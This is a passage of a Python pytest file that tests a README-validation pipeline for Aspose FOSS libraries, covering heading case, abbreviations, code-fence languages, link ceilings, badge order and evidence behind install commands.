# spacing, visible sections, narration vocabulary, At a Glance label geometry. Each rule quotes
# plans/idea.md or docs/README_CONTRACT.md in the work item's PR; each has a negative control.
# ---------------------------------------------------------------------------------------------

_EXAMPLES_OPEN = (
    "## Additional Examples\n\nLead-in.\n\n<details>\n"
    "<summary>View Additional Examples</summary>\n\n"
)
_EXAMPLES_CLOSE = "\n</details>\n"


def _with_example_heading(heading: str) -> Candidate:
    section = _EXAMPLES_OPEN + f"### {heading}\n\n```python\nprint(1)\n```\n" + _EXAMPLES_CLOSE
    return _candidate(_candidate().readme + "\n" + section)


def _structure_details(candidate: Candidate, tmp_path: Path) -> list[str]:
    document = validate_candidate(candidate, tmp_path, ())
    return next(check for check in document["checks"] if check["id"] == "BC-07")["details"]


def test_a_mis_cased_abbreviation_in_a_heading_fails(tmp_path: Path) -> None:
    """plans/idea.md: "Visitor-facing technical abbreviations use their canonical uppercase forms
    throughout, including PS, EPS, PDF, XPS, XLSX, HTML". `_prose` drops every heading line, so a
    heading was never read for this at all (V2 item 8)."""
    details = _structure_details(_with_example_heading("Convert Pdf to Image"), tmp_path)
    assert (
        "heading '### Convert Pdf to Image': abbreviation 'Pdf' is not in its canonical form PDF"
        in details
    )
    # a mixed-case standard has one canonical spelling: npm
    details = _structure_details(_with_example_heading("Install with NPM"), tmp_path)
    assert (
        "heading '### Install with NPM': abbreviation 'NPM' is not in its canonical form npm"
        in details
    )


def test_a_level_three_task_heading_with_the_wrong_title_case_fails(tmp_path: Path) -> None:
    """plans/idea.md: "Every Markdown heading uses title case." A level-three task heading skipped
    the shell-heading test by an explicit `continue` and was never title-cased (V2 item 8)."""
    details = _structure_details(_with_example_heading("Save a scene to disk"), tmp_path)
    assert "heading '### Save a scene to disk' is not in title case: 'scene', 'disk'" in details
    details = _structure_details(_with_example_heading("Save a Scene to Disk"), tmp_path)
    assert not any("Save a Scene to Disk" in detail for detail in details)


def test_the_legitimate_ps_form_passes_in_a_heading_and_in_prose(tmp_path: Path) -> None:
    details = _structure_details(_with_example_heading("Convert PS to PDF"), tmp_path)
    assert not any("Convert PS to PDF" in detail for detail in details)
    readme = _candidate().readme.replace(
        "## Scope and Limitations\n\n", "## Scope and Limitations\n\nIt reads PS files.\n\n"
    )
    assert "It reads PS files." in readme
    assert not any("abbreviation" in d for d in _structure_details(_candidate(readme), tmp_path))


def test_ps_is_an_abbreviation_that_lowercase_prose_can_no_longer_slip_past(
    tmp_path: Path,
) -> None:
    """The fixed set lacked "PS" and the discovered-extension gate demanded three letters, so
    "ps" was unspellable either way. Both now name it (components/terminology.py)."""
    readme = _candidate().readme.replace(
        "## Scope and Limitations\n\n", "## Scope and Limitations\n\nIt reads ps files.\n\n"
    )
    document = validate_candidate(_candidate(readme), tmp_path, ())
    structure = _failed(document, "BC-07")
    detail = "abbreviation 'ps' is not in its canonical form PS"
    assert detail in structure["details"]
    located = next(f for f in structure["failures"] if f["detail"] == detail)
    assert located["section_id"] == "scope_limitations"


def test_a_heading_case_failure_names_the_llm_owned_section_that_wrote_it(tmp_path: Path) -> None:
    document = validate_candidate(_with_example_heading("Save a scene to disk"), tmp_path, ())
    structure = _failed(document, "BC-07")
    located = next(f for f in structure["failures"] if "title case" in f["detail"])
    assert located["section_id"] == "additional_examples" and located["causal_stage"] == "COMPOSING"


def test_a_level_four_heading_is_title_cased_too(tmp_path: Path) -> None:
    readme = _candidate().readme + "\n#### Detailed member reference\n"
    details = _structure_details(_candidate(readme), tmp_path)
    assert any("'#### Detailed member reference' is not in title case" in d for d in details)


def test_the_renderer_title_cases_the_task_heading_the_model_wrote() -> None:
    """The fix lives where the heading is made: the unit is the model's sentence, the heading is
    the template's. Re-rendering a sealed candidate's own units yields a passing document."""
    facts = FactsDocument(
        FACTS.repository,
        FACTS.source_revision,
        (
            *FACTS.facts,
            _fact(
                "example:002",
                "example",
                "print(2)\n",
                "lines 1-2; python fence; unit inherited_unit:900.code_block",
                "example 2: EXECUTED; exit 0",
            ),
        ),
    )
    plan = {
        **PLAN,
        "sections": [
            {
                **section,
                "include": section["include"] or section["section_id"] == "additional_examples",
            }
            for section in PLAN["sections"]
        ],
        "additional_example_ids": ["example:002"],
    }
    units = {
        "units": [
            *UNITS["units"],
            _unit("additional_examples", "workflow:example:002", "Save a scene to a PS file."),
        ],
        "omitted": [],
    }
    readme = render_readme(ENTRY, facts, plan, units, DISPOSITIONS)
    assert "### Save a Scene to a PS File" in readme
    assert "### Save a scene" not in readme


def test_a_fence_without_a_language_fails(tmp_path: Path) -> None:
    """plans/idea.md: "Every source fence carries its correct language identifier"; README_CONTRACT
    row 10: "Correct fence language"."""
    readme = _candidate().readme.replace(
        "## Scope and Limitations\n\n",
        "## Scope and Limitations\n\n```\nsome output\n```\n\n",
    )
    details = _structure_details(_candidate(readme), tmp_path)
    assert any(
        d.startswith("code fence at line") and d.endswith("has no language") for d in details
    )
    fenced = readme.replace("```\nsome output", "```text\nsome output")
    assert not any("has no language" in d for d in _structure_details(_candidate(fenced), tmp_path))


def test_a_placed_inherited_code_block_is_exempt_from_the_fence_language_rule(
    tmp_path: Path,
) -> None:
    """Check 8 requires a placed inherited block to render exactly as the upstream wrote it, so an
    upstream fence with no info string is the upstream's own spelling, not this check's to judge."""
    facts = FactsDocument(
        FACTS.repository,
        FACTS.source_revision,
        (
            *FACTS.facts,
            _fact("inherited_unit:901.code_block", "inherited_unit", "```\nsome output\n```"),
        ),
    )
    dispositions = {
        "dispositions": [
            *DISPOSITIONS["dispositions"],
            {
                "unit_id": "inherited_unit:901.code_block",
                "disposition": "VERIFIED_MOVE",
                "destination_section": "scope_limitations",
                "fact_ids": [],
                "rationale": "r",
            },
        ]
    }
    candidate = _candidate(facts=facts, dispositions=dispositions)
    assert "```\nsome output\n```" in candidate.readme
    assert not any("has no language" in d for d in _structure_details(candidate, tmp_path))


def test_a_repeated_empty_line_run_fails_outside_and_inside_a_fence(tmp_path: Path) -> None:
    """plans/idea.md: "visitor examples use normalized, language-valid spacing without repeated
    empty-line runs"."""
    readme = _candidate().readme
    spaced = readme.replace("## Scope and Limitations\n\n", "## Scope and Limitations\n\n\n")
    assert spaced != readme
    details = _structure_details(_candidate(spaced), tmp_path)
    assert any(d.startswith("repeated empty-line run ending at line") for d in details)
    inside = readme.replace("Scene().save('a.glb')\n", "Scene().save('a.glb')\n\n\nprint(1)\n")
    assert inside != readme
    details = _structure_details(_candidate(inside), tmp_path)
    assert any("has a repeated empty-line run" in d for d in details)
    # a single empty line inside and outside a fence is normal spacing
    assert not any("empty-line" in d for d in _structure_details(_candidate(), tmp_path))


def test_the_assembled_document_never_carries_an_empty_line_run() -> None:
    assert collapse_document_blank_runs("a\n\n\n\nb\n") == "a\n\nb\n"
    fenced = "a\n\n```text\nx\n\n\ny\n```\n\n\nb\n"
    assert collapse_document_blank_runs(fenced) == "a\n\n```text\nx\n\n\ny\n```\n\nb\n"
    assert "\n\n\n" not in _candidate().readme


def test_a_visible_section_inside_a_collapsed_block_fails(tmp_path: Path) -> None:
    """plans/idea.md: "installation, the minimal example, all selected core capabilities, every
    material limitation, top APIs, and the visitor-relevant development and testing summary remain
    visible ... Only secondary material such as additional examples and long API inventories may be
    collapsed"; README_CONTRACT row 17: "Never collapsed"."""
    readme = _candidate().readme
    hidden = readme.replace(
        "## Installation\n", "<details>\n<summary>Show</summary>\n\n## Installation\n", 1
    ).replace("## Quick Start\n", "</details>\n\n## Quick Start\n", 1)
    assert hidden != readme
    details = _structure_details(_candidate(hidden), tmp_path)
    assert "visible section 'Installation' renders inside a collapsed <details> block" in details
    # the shell's own collapsible sections may be collapsed
    assert not any("collapsed" in d for d in _structure_details(_candidate(), tmp_path))


def test_narration_covers_the_vocabulary_idea_md_lists_in_every_form(tmp_path: Path) -> None:
    """plans/idea.md: "Source revisions, isolated-build conditions, network policy, registry
    receipts, provider calls, evidence collectors, and validation status belong in evidence". One
    occurrence blocks - the contract states no count threshold."""
    readme = _candidate().readme
    for sentence, phrase in (
        ("The network policy blocks it.", "network policy"),
        ("Registry receipts confirm it.", "registry receipt"),
        ("Evidence collectors ran.", "evidence collector"),
        ("The validation status is green.", "validation status"),
        ("It made two provider calls.", "provider call"),
        ("Tied to source revisions.", "source revision"),
        ("An isolated-build condition.", "isolated build"),
        ("Network policies apply.", "network policy"),
    ):
        narrated = readme.replace(
            "## Scope and Limitations\n\n", f"## Scope and Limitations\n\n{sentence}\n\n"
        )
        assert narrated != readme
        details = _structure_details(_candidate(narrated), tmp_path)
        assert f"internal narration {phrase!r}" in details, sentence


def test_an_at_a_glance_label_that_wraps_past_three_lines_fails(tmp_path: Path) -> None:
    """README_CONTRACT section 2.1: "no label wrapping past three lines at Mermaid's default node
    width - a longer title is shortened at planning, never clipped at render"."""
    readme = _candidate().readme
    long_label = " ".join(["Export", "scenes"] * 10)
    widened = readme.replace('c1["Build scenes"]', f'c1["{long_label}"]')
    assert widened != readme
    document = validate_candidate(_candidate(widened), tmp_path, ())
    structure = _failed(document, "BC-07")
    located = next(f for f in structure["failures"] if "wraps to" in f["detail"])
    assert located["causal_stage"] == "PLANNING"
    assert "lines at the common node width of 28 characters; at most 3" in located["detail"]
    assert not any("wraps to" in d for d in _structure_details(_candidate(), tmp_path))


def _link_fact(name: str, url: str) -> Fact:
    return Fact(f"link_target:{name}", "link_target", url, (Evidence(url, "HTTP 200"),))


def _with_links(*extra: Fact) -> FactsDocument:
    return FactsDocument(FACTS.repository, FACTS.source_revision, (*FACTS.facts, *extra))


def test_the_aspose_ceiling_counts_contextual_links_not_the_mandated_rows() -> None:
    # README_CONTRACT.md row 15 bounds the contextual Aspose links; the banner (row 3) and the
    # Enterprise target (row 18) are mandated rows rendered from verified product facts.
    docs = [_link_fact(f"doc{n}", f"https://docs.aspose.org/3d/python/page-{n}/") for n in range(5)]
    banner = _link_fact(
        "product.banner", "https://products.aspose.org/media/3d/python/banner-readme.png"
    )
    homepage = _link_fact("product.homepage", "https://products.aspose.org/3d/python/")
    enterprise = _link_fact("product.enterprise", "https://products.aspose.com/3d/python-net/")
    facts = _with_links(*docs, banner, homepage, enterprise)
    base = _candidate().readme
    nl = chr(10)
    mandated = (
        f"[![Aspose.3D FOSS for Python]({banner.value})]({homepage.value})"
        f"{nl}{nl}[full-featured Aspose.3D for Python — Enterprise Edition]"
        f"({enterprise.value}){nl}"
    )
    # Little visible prose: the derived total is 2, and only contextual links count against it.
    two = " ".join(f"[page {n}]({docs[n].value})" for n in range(2))
    within = _candidate(readme=nl.join([base, mandated, two, ""]), facts=facts)
    assert not any("exceed" in str(failure) for failure in _check_links(within))
    three = f"{two} [page 2]({docs[2].value})"
    over = _candidate(readme=nl.join([base, mandated, three, ""]), facts=facts)
    assert any("3 Aspose links exceed the ceiling of" in str(f) for f in _check_links(over))


def test_the_ceiling_is_derived_from_this_documents_size_and_examples() -> None:
    # Negative control for the old fixed constant of 4: a short README with no verified example
    # earns a total of 2, so three contextual links fail even though 3 < 4.
    links = [
        _link_fact("d", "https://docs.aspose.org/3d/python/"),
        _link_fact("k", "https://kb.aspose.org/3d/python/"),
        _link_fact("r", "https://reference.aspose.org/3d/python/"),
    ]
    facts = _with_links(*links)
    nl = chr(10)
    row = " ".join(f"[{link.id[-1]}]({link.value})" for link in links)
    short = _candidate(readme=nl.join(["# T", "", "A few words.", "", row, ""]), facts=facts)
    failures = [str(f) for f in _check_links(short) if f.stage == "PLANNING"]
    assert any("3 Aspose links exceed the ceiling of 2" in f for f in failures)
    # The same three links in a document with enough visible prose are within a total of 4.
    words = " ".join(["word"] * 1300)
    long = _candidate(readme=nl.join(["# T", "", words, "", row, ""]), facts=facts)
    assert not any("exceed" in str(f) for f in _check_links(long))


def test_the_per_surface_and_per_domain_slots_are_enforced() -> None:
    nl = chr(10)
    words = " ".join(["word"] * 1300)
    blogs = [_link_fact(f"b{n}", f"https://blog.aspose.org/post-{n}/") for n in range(2)]
    coms = [_link_fact(f"c{n}", f"https://docs.aspose.com/page-{n}/") for n in range(3)]
    facts = _with_links(*blogs, *coms)

    def failures(selected: list[Fact]) -> list[str]:
        row = " ".join(f"[x{n}]({f.value})" for n, f in enumerate(selected))
        candidate = _candidate(readme=nl.join(["# T", "", words, "", row, ""]), facts=facts)
        return [str(f) for f in _check_links(candidate) if f.stage == "PLANNING"]

    assert any("2 blog links exceed the blog slot ceiling of 1" in f for f in failures(blogs))
    assert any("3 aspose.com links exceed the aspose.com ceiling of 2" in f for f in failures(coms))
    assert failures([blogs[0], coms[0], coms[1]]) == []


def test_a_configured_link_policy_replaces_the_derived_ceilings() -> None:
    links = [_link_fact(f"d{n}", f"https://docs.aspose.org/3d/python/p{n}/") for n in range(3)]
    facts = _with_links(*links)
    nl = chr(10)
    row = " ".join(f"[x{n}]({f.value})" for n, f in enumerate(links))
    readme = nl.join(["# T", "", "Short.", "", row, ""])
    derived = _candidate(readme=readme, facts=facts)
    assert any("exceed" in str(f) for f in _check_links(derived))
    roomy = PlanningPolicy(link_allocation=LinkAllocationPolicy(5, 5, 1, 1, 5, 1, 1, 1))
    configured = dataclasses.replace(derived, policy=roomy)
    assert not any("exceed" in str(f) for f in _check_links(configured))
    tight = PlanningPolicy(link_allocation=LinkAllocationPolicy(5, 5, 1, 1, 1, 1, 1, 1))
    assert any(
        "3 docs links exceed the docs slot ceiling of 1" in str(f)
        for f in _check_links(dataclasses.replace(derived, policy=tight))
    )


ENTERPRISE_URL = "https://products.aspose.com/3d/python-net/"


def _enterprise_candidate(anchor: str | None) -> Candidate:
    enterprise = Fact(
        "link_target:product.enterprise",
        "link_target",
        ENTERPRISE_URL,
        (Evidence(ENTERPRISE_URL, "HTTP 200; enterprise target"),),
        attributes={"role": "enterprise", "level": "platform", "platform": "python"},
    )
    plan = {
        **PLAN,
        "sections": [
            {**entry, "include": True}
            if entry["section_id"] == "enterprise_relationship"
            else entry
            for entry in PLAN["sections"]
        ],
    }
    paragraph = "" if anchor is None else f"[{anchor}]({ENTERPRISE_URL}) adds more."
    readme = _candidate().readme + "\n" + paragraph + "\n"
    return _candidate(readme=readme, facts=_with_links(enterprise), plan=plan)


def test_the_enterprise_anchor_must_be_full_featured_and_link_the_verified_target() -> None:
    good = _enterprise_candidate("full-featured Aspose.3D for Python — Enterprise Edition")
    assert not [f for f in _check_links(good) if f.section == "enterprise_relationship"]
    for bad in (
        "Aspose.3D for Python — Enterprise Edition",  # the pre-fix anchor: no full-featured
        "full-featured Aspose.3D for Python",  # no edition name at the end
        "click here",
    ):
        failures = [f for f in _check_links(_enterprise_candidate(bad)) if f.section]
        assert any("full-featured <product>" in f.detail for f in failures), bad
    missing = [f for f in _check_links(_enterprise_candidate(None)) if f.section]
    assert any("is not linked from the document" in f.detail for f in missing)


def test_without_a_verified_enterprise_target_no_anchor_is_required() -> None:
    assert not [f for f in _check_links(_candidate()) if f.section == "enterprise_relationship"]


def _row_candidate(row: str, extra: tuple[Fact, ...] = ()) -> Candidate:
    floor = _fact("package:python_requires", "package", ">=3.7")
    base = _candidate(facts=_with_links(floor, *extra))
    lines = base.readme.splitlines()
    index = next(i for i, line in enumerate(lines) if line.startswith("[![PyPI]"))
    lines[index] = row
    return dataclasses.replace(base, readme="\n".join(lines) + "\n")


PYPI = (
    "[![PyPI](https://img.shields.io/pypi/v/aspose-3d-foss.svg)]"
    "(https://pypi.org/project/aspose-3d-foss/)"
)
RUNTIME = "![Python](https://img.shields.io/badge/python-3.7%2B-blue.svg)"
LICENSE_BADGE = "[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)"
CI_FACT = Fact(
    "link_target:badge.ci",
    "link_target",
    f"https://github.com/{ENTRY.repository}/actions/workflows/ci.yml",
    (Evidence(".github/workflows/ci.yml", "triggers push on main; runs pytest"),),
    attributes={"role": "build status badge", "branch": "main"},
)
CI_BADGE = f"[![Build Status]({CI_FACT.value}/badge.svg?branch=main)]({CI_FACT.value})"


def _badge_failures(candidate: Candidate) -> list[str]:
    return [f.detail for f in _check_structure(candidate) if f.section == "badges"]


def test_the_renderers_own_badge_row_passes_the_badge_check() -> None:
    assert _badge_failures(_candidate()) == []
    full = _row_candidate(f"{PYPI} {RUNTIME} {CI_BADGE} {LICENSE_BADGE}", (CI_FACT,))
    assert _badge_failures(full) == []


def test_a_badge_row_out_of_the_stable_order_is_a_blocking_failure() -> None:
    swapped = _row_candidate(f"{PYPI} {LICENSE_BADGE} {RUNTIME}")
    details = _badge_failures(swapped)
    assert any("breaks the stable order" in d for d in details), details
    # Build status belongs between the runtime and the license, not after it.
    late = _row_candidate(f"{PYPI} {RUNTIME} {LICENSE_BADGE} {CI_BADGE}", (CI_FACT,))
    assert any("breaks the stable order" in d for d in _badge_failures(late))


def test_a_duplicated_or_fabricated_badge_is_a_blocking_failure() -> None:
    twice = _row_candidate(f"{PYPI} {RUNTIME} {RUNTIME} {LICENSE_BADGE}")
    assert any("duplicate runtime badge" in d for d in _badge_failures(twice))
    # A build badge with no verified workflow fact is fabricated, whatever its URL looks like.
    forged = _row_candidate(f"{PYPI} {RUNTIME} {CI_BADGE} {LICENSE_BADGE}")
    assert any("build badge is not supported" in d for d in _badge_failures(forged))
    # So is a contributors badge the source README never carried.
    contributors = (
        f"[![Contributors](https://img.shields.io/github/contributors/{ENTRY.repository})]"
        f"(https://github.com/{ENTRY.repository}/graphs/contributors)"
    )
    unconditional = _row_candidate(f"{PYPI} {RUNTIME} {LICENSE_BADGE} {contributors}")
    assert any("contributors badge is not supported" in d for d in _badge_failures(unconditional))
    # A runtime badge stating a floor the manifest does not declare differs from the fact.
    other = "![Python](https://img.shields.io/badge/python-3.12%2B-blue.svg)"
    wrong = _row_candidate(f"{PYPI} {other} {LICENSE_BADGE}")
    assert any("runtime badge differs from the verified one" in d for d in _badge_failures(wrong))


def test_an_omitted_badge_is_allowed() -> None:
    assert _badge_failures(_row_candidate(LICENSE_BADGE)) == []
    assert _badge_failures(_row_candidate(f"{PYPI} {LICENSE_BADGE}")) == []


def _without_badge_worthy_facts(*extra: Fact) -> FactsDocument:
    return FactsDocument(
        FACTS.repository,
        FACTS.source_revision,
        tuple(f for f in FACTS.facts if f.kind not in ("package", "license")) + extra,
    )


def test_zero_badge_worthy_facts_needs_no_badge_row() -> None:
    # aspose-psd-foss/Aspose.PSD-FOSS-for-Python: no packaging metadata exists at all (no
    # package fact, no license fact, no other badge-source fact), so the renderer emits no
    # badge; that absence is the correct render, not a BC-07 gap.
    candidate = _candidate(facts=_without_badge_worthy_facts())
    details = [f.detail for f in _check_structure(candidate)]
    assert not any("expected one badge row" in d for d in details), details


def test_a_badge_worthy_fact_with_no_rendered_badge_still_fails() -> None:
    # Negative control, must not regress: a badge-worthy fact exists (a license claim), but it
    # is incomplete (no license:file fact), so the renderer still emits no badge - and that is
    # still a real gap, exactly as before the fix.
    half_license = _without_badge_worthy_facts(_fact("license:spdx", "license", "MIT"))
    candidate = _candidate(facts=half_license)
    details = [f.detail for f in _check_structure(candidate)]
    assert any("expected one badge row; found 0" in d for d in details), details


def test_a_badge_worthy_fact_with_one_rendered_badge_passes() -> None:
    # The ordinary case, unchanged: a badge-worthy fact exists and the renderer's own row covers
    # it, so the check passes as it always did.
    assert _badge_failures(_candidate()) == []
    assert not any("expected one badge row" in f.detail for f in _check_structure(_candidate()))


def test_check_four_blocks_a_unit_citing_another_slots_facts(tmp_path: Path) -> None:
    # README_CONTRACT.md check 4 as revised: the plan bound every capability slot to
    # identity:repository, so a capability citing the GLB format fact cites another set.
    units = copy.deepcopy(UNITS)
    crossed = next(u for u in units["units"] if u["slot"] == "capability:1")
    crossed["fact_ids"] = [*crossed["fact_ids"], "format:output.glb"]
    document = validate_candidate(_candidate(units=units), tmp_path, ())
    assert _failed(document, "BC-04")["details"] == [
        "key_capabilities: unit capability:1: cites facts outside its slot's planned set "
        "(format:output.glb); a unit describes its own slot's facts, never another slot's"
    ]


def test_row_fourteen_refuses_two_facts_at_one_canonical_location(tmp_path: Path) -> None:
    # README_CONTRACT.md row 14 as revised: one verified public type per canonical defining
    # location; a second fact at the same location is an extraction defect.
    def camera(fact_id: str) -> Fact:
        return Fact(
            fact_id,
            "public_symbol",
            "aspose.threed.Camera",
            (Evidence("aspose/threed/camera.py", "line 1; class; public by name"),),
            attributes={"symbol_kind": "class", "docstring": "A camera in the scene."},
        )

    facts = FactsDocument(
        FACTS.repository,
        FACTS.source_revision,
        (
            *FACTS.facts,
            camera("public_symbol:aspose.threed.camera"),
            camera("public_symbol:aspose.threed.camera-2"),
        ),
    )
    document = validate_candidate(_candidate(facts=facts), tmp_path, ())
    assert (
        "verified public type aspose.threed.Camera is recorded 2 times; one fact per canonical "
        "defining location"
    ) in _failed(document, "BC-07")["details"]


def test_a_hub_heading_the_renderer_disambiguates_is_a_shell_heading_for_check_seven() -> None:
    """G4-W17 arrival item 58 (lane F PROPOSAL F8). README_CONTRACT.md row 14 heads a Detailed
    Member Reference group with the hub type's table name, and the renderer gives a type that
    shares its final segment with another verified type the shortest dotted suffix that tells
    them apart (`### ThreeD.Property`). BC-07 re-derived bare last segments instead and failed
    that heading unrepairably - measured 2026-09-11 on 34 of Aspose.PDF for .NET's 899 verified
    types and 2 of Aspose.3D for .NET's 293. Both readers now take the name from one function."""

    def symbol(value: str, docstring: str) -> Fact:
        return Fact(
            f"public_symbol:{value.lower()}",
            "public_symbol",
            value,
            (Evidence("aspose/threed/property.py", "line 1; class; public by name"),),
            attributes={"symbol_kind": "class", "docstring": docstring},
        )

    facts = FactsDocument(
        ENTRY.repository,
        REVISION,
        (
            *FACTS.facts,
            symbol("aspose.threed.Property", "A named property on a scene object."),
            symbol("aspose.threed.formats.gltf.Property", "A glTF extension property."),
        ),
    )
    plan = copy.deepcopy(PLAN)
    plan["api_hubs"] = [
        {"symbol_fact_id": "public_symbol:aspose.threed.property", "fact_ids": ["example:001"]}
    ]
    units = copy.deepcopy(UNITS)
    units["units"] = [
        *(u for u in units["units"] if u["slot"] != "hub:public_symbol:aspose.threed.scene"),
        _unit(
            "api_reference",
            "hub:public_symbol:aspose.threed.property",
            "Property carries one named value.",
        ),
    ]
    candidate = _candidate(facts=facts, plan=plan, units=units)
    # The fixture is the measured shape: the renderer wrote the disambiguated heading, and it is
    # the very name api_reference_names gives the hub - one function, not two models.
    heading = f"### {api_reference_names(facts)['aspose.threed.Property']}"
    assert heading == "### threed.Property" and heading in candidate.readme.splitlines()

    def heading_failures(readme: str) -> list[str]:
        judged = _candidate(readme=readme, facts=facts, plan=plan, units=units)
        return [f.detail for f in _check_structure(judged) if "shell heading" in f.detail]

    assert heading_failures(candidate.readme) == []
    # Mutation: the bare segment the old model accepted is not a name the renderer ever gives an
    # ambiguous type, so it is judged exactly like any other heading the shell does not define.
    bare = candidate.readme.replace(heading, "### Property")
    assert heading_failures(bare) == ["heading '### Property' is not a shell heading in title case"]
    invented = candidate.readme.replace(heading, "### Made Up Topic")
    assert heading_failures(invented) == [
        "heading '### Made Up Topic' is not a shell heading in title case"
    ]


def _install_candidate(fact: Fact, readme: str) -> Candidate:
    facts = FactsDocument(ENTRY.repository, REVISION, (fact,))
    return Candidate(
        ENTRY,
        facts,
        PLAN,
        UNITS,
        DISPOSITIONS,
        readme,
        ORIGINAL,
        REVISION,
        hashlib.sha256(ORIGINAL).hexdigest(),
        (),
        TASKS,
    )


def test_a_verified_source_build_satisfies_bc_02_without_a_registry_reading() -> None:
    """G4-W17 arrival item 0: a source-kind install fact carries manifest evidence and a
    verified-source-build reading instead of a package-registry one, and BC-02 accepts it."""
    command = "git clone https://github.com/org/Widget.git\ncd Widget\ndotnet build"
    supported = Fact(
        "install_command:dotnet",
        "install_command",
        command,
        (
            Evidence(
                "Widget.csproj", "install command for the package id declared by the manifest"
            ),
            Evidence(
                "examples.json", "verified source build: an example executed against this revision"
            ),
        ),
        attributes={"install_kind": "source"},
    )
    readme = f"```bash\n{command}\n```"
    assert _check_install(_install_candidate(supported, readme)) == []

    # A registry-only reading (no "verified source build" phrase) still needs "package registry".
    registry_only = Fact(
        "install_command:dotnet",
        "install_command",
        "dotnet add package Widget",
        (Evidence("Widget.csproj", "install command for the package id declared by the manifest"),),
    )
    failures = _check_install(
        _install_candidate(registry_only, "```bash\ndotnet add package Widget\n```")
    )
    assert failures[0].detail == (
        "install_command:dotnet lacks manifest, package-registry, or source-build evidence: "
        "install command for the package id declared by the manifest"
    )


def test_bc_02_refuses_a_registry_command_the_registry_says_is_not_there() -> None:
    """Mutation control for the unverified `dotnet add package` claim (Imaging-FOSS for .NET,
    2026-10-04): if the admission step ever flipped a 404-contradicted registry install to
    SUPPORTED, its evidence would still carry "package registry" - the old check's only test -
    and the unverified command would ship. A SUPPORTED registry-kind install whose own reading
    found no distribution is refused, whatever the wording around it."""
    command = "dotnet add package Widget"
    mutant = Fact(
        "install_command:dotnet",
        "install_command",
        command,
        (
            Evidence(
                "Widget.csproj", "install command for the package id declared by the manifest"
            ),
            Evidence(
                "https://api.nuget.org/v3-flatcontainer/widget/index.json",
                "package registry: distribution not found on nuget",
            ),
        ),
        polarity="SUPPORTED",
    )
    failures = _check_install(_install_candidate(mutant, f"```bash\n{command}\n```"))
    assert [failure.stage for failure in failures] == ["EXTRACTING"]
    assert "found no distribution" in failures[0].detail


def test_bc_02_refuses_an_npm_command_the_registry_says_is_not_there() -> None:
    """Mutation control for the unverified `npm install` claim (Aspose.PDF and Aspose.3D for
    TypeScript, 2026-10-04): the npm registry answers 404 for the declared package, and a
    SUPPORTED registry-kind install whose own reading found no distribution is refused, whatever
    its wording - the same control the .NET install carries."""
    command = "npm install @aspose/widget"
    mutant = Fact(
        "install_command:npm",
        "install_command",
        command,
        (
            Evidence("package.json", "install command for the name declared by the manifest"),
            Evidence(
                "https://registry.npmjs.org/@aspose%2Fwidget",
                "package registry: distribution not found on npm",
            ),
        ),
        polarity="SUPPORTED",
    )
    failures = _check_install(_install_candidate(mutant, f"```bash\n{command}\n```"))
    assert [failure.stage for failure in failures] == ["EXTRACTING"]
    assert "found no distribution" in failures[0].detail


def test_bc_02_refuses_a_source_build_advertising_a_step_its_receipt_did_not_prove() -> None:
    """G4-W17 arrival item 50: BC-02 consults the per-repository receipt for the exact command
    it names. A source-kind fact whose receipt proved `npm install` may advertise exactly that;
    one that renders `npm run build` on top advertises a compile nobody measured - the
    fabricated-claim shape lane B refused to write for Aspose.Cells for TypeScript."""
    prefix = "git clone https://github.com/org/Widget.git\ncd Widget\n"

    def source_fact(value: str) -> Fact:
        return Fact(
            "install_command:npm",
            "install_command",
            value,
            (
                Evidence("package.json", "install command for the name declared by the manifest"),
                Evidence(
                    "examples.json",
                    "verified source build: the verifier ran `npm install` against this "
                    "revision, every step exiting 0; the advertised steps are exactly the ones "
                    "it ran",
                ),
            ),
            attributes={"install_kind": "source", "build_command": "npm install"},
        )

    honest = source_fact(prefix + "npm install")
    assert _check_install(_install_candidate(honest, f"```bash\n{honest.value}\n```")) == []
    inflated = source_fact(prefix + "npm install\nnpm run build")
    failures = _check_install(_install_candidate(inflated, f"```bash\n{inflated.value}\n```"))
    assert [failure.detail for failure in failures] == [
        "install_command:npm advertises build steps its receipt did not prove: the receipt "
        "names 'npm install', the command ends 'npm install\\nnpm run build'"
    ]
    # The template path (no receipt attribute) is judged exactly as before this item.
    templated = dataclasses.replace(honest, attributes={"install_kind": "source"})
    assert _check_install(_install_candidate(templated, f"```bash\n{templated.value}\n```")) == []


def test_bc_02_accepts_a_source_checkout_fact_that_never_claims_a_verified_build() -> None:
    """`RESEARCH_LANE_E.md`'s documented-PYTHONPATH-source-install observation, reproducing
    `aspose-html-foss/Aspose.HTML-FOSS-for-Python`'s exact shape: a `source_checkout`-kind fact
    is honest that no build/install command ever succeeded, so it never earns the "verified
    source build" phrase the other tiers use - BC-02 accepts it by its own `install_kind`
    attribute instead, extending the same acceptance rather than a parallel check."""
    command = (
        "git clone https://github.com/aspose-html-foss/Aspose.HTML-FOSS-for-Python.git\n"
        "cd Aspose.HTML-FOSS-for-Python\n"
        'export PYTHONPATH="src:.:$PYTHONPATH"'
    )
    checkout = Fact(
        "install_command:pip",
        "install_command",
        command,
        (
            Evidence("pyproject.toml", "distribution name declared by the manifest"),
            Evidence(
                "https://pypi.org/pypi/aspose-html-foss/json",
                "package registry: distribution not found",
            ),
            Evidence(
                "examples.json",
                "source checkout only: every build/install attempt failed identically for this "
                "revision, but an example executed against the repository's own source tree "
                "with no build step - the advertised step is adding that tree to the "
                "interpreter's path, never a build or install command, which was never proven "
                "to succeed",
            ),
        ),
        attributes={"install_kind": "source_checkout"},
    )
    assert _check_install(_install_candidate(checkout, f"```bash\n{command}\n```")) == []

    # Mutation: strip the manifest evidence away - the checkout kind alone never substitutes
    # for it, exactly like the existing "source" and registry paths still require it.
    bare = dataclasses.replace(
        checkout, evidence=(Evidence("examples.json", "source checkout only: x"),)
    )
    failures = _check_install(_install_candidate(bare, f"```bash\n{command}\n```"))
    assert failures and "lacks manifest" in failures[0].detail

    # Mutation: the rendered README drops the command - COMPOSING still catches it even though
    # EXTRACTING's acceptance passed.
    missing_render = _check_install(_install_candidate(checkout, "nothing here"))
    assert missing_render and "does not render" in missing_render[0].detail


EDITION_SUBSTITUTES = (
    "commercial edition",
    "Commercial Edition",
    "COMMERCIAL EDITION",
    "On-Premise edition",
    "on-premises edition",
    "paid version",
    "full version",
    "premium edition",
    "commercial\nedition",
)


@pytest.mark.parametrize("phrase", EDITION_SUBSTITUTES)
def test_bc06_fails_every_edition_substitute_in_any_letter_case(
    phrase: str, tmp_path: Path
) -> None:
    sound = _candidate()
    assert "edition" not in sound.readme.lower().replace("enterprise edition", "")
    document = validate_candidate(
